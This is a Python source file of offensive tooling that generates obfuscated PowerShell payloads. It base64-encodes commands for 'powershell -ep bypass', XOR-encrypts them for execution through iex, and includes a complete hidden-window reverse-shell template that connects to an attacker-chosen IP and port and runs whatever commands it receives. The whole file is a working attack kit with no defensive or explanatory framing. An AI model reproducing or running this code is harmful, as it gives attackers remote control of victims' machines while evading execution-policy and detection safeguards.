import base64
import random
import sys

class PwshUtils(object):
    """PwshUtils is a Class providing utils function for powershell"""
    
    @staticmethod
    def encodeForPwsh(val):
        return base64.b64encode(val.encode('utf16')[2:]).decode()

    @staticmethod
    def make_pwsh_cmd(val):
        return "powershell -ep bypass -e " + PwshUtils.encodeForPwsh(val)

    @staticmethod
    def define_xor():
        return 'function xor($a, $b){$c="";for($i=0;$i -lt $a.Length;$i++){$c += [char]($a[$i] -bxor $b[$i%$b.Length])}return $c;}'


class ObfUtil:
    """
    ObfUtil is just here to help for obfuscate some commands (like rev powershell)
    """

    @staticmethod
    def get_xor_for(target):
        cipher = "@("
        n = len(target)
        key = ObfUtil.get_random_string(n)
        for i in range(n):
            cipher += str(ord(target[i]) ^ ord(key[i]))
            if(i != n-1):
                cipher += ','
        cipher += ')'
        return (cipher, key)

    @staticmethod
    def get_random_string(size=32):
        alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        return ''.join(random.choice(alphabet) for _ in range(size))

    @staticmethod
    def xor_obfuscate(cmd_to_execute):
        cmd = PwshUtils.define_xor() # First define the xor function
        cmd += ";"
        cmd += ObfUtil.to_xor(cmd_to_execute)

        return PwshUtils.make_pwsh_cmd(cmd)

    @staticmethod
    def to_xor(cmd_to_execute):
        cipher, key = ObfUtil.get_xor_for(cmd_to_execute)
        return f"iex(xor {cipher} \"{key}\")"

class ReverseShell:
    TEMPLATE = """Start-Process $PSHOME\\powershell.exe -ArgumentList {$myTcpClient = New-Object System.Net.Sockets.TCPClient('$$IP_ADDR$$', $$PORT$$);Start-Sleep -Seconds 0.3;$stream = $myTcpClient.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex (". { $data } 2>&1") | Out-String ); $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$myTcpClient.Close()} -WindowStyle Hidden"""
    # TEMPLATE = """Start-Process $PSHOME\\powershell.exe -ArgumentList {$myTcpClient = New-Object System.Net.Sockets.TCPClient('$$IP_ADDR$$', $$PORT$$);Start-Sleep -Seconds 0.3;$stream = $myTcpClient.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex (". { $data } 2>&1") | Out-String ); $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$myTcpClient.Close()}"""
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def get_content(self):
        return ReverseShell.TEMPLATE.replace("$$IP_ADDR$$", self.ip).replace("$$PORT$$", str(self.port))


if __name__ == '__main__':
    if(len(sys.argv) != 2):
        print("Usage: xor_obf.py '<payload>'")
        exit(1)

    payload = sys.argv[1]
    encoded_payload = PwshUtils.define_xor() + ";"
    encoded_payload += ObfUtil.to_xor(payload)
    
    print(encoded_payload)
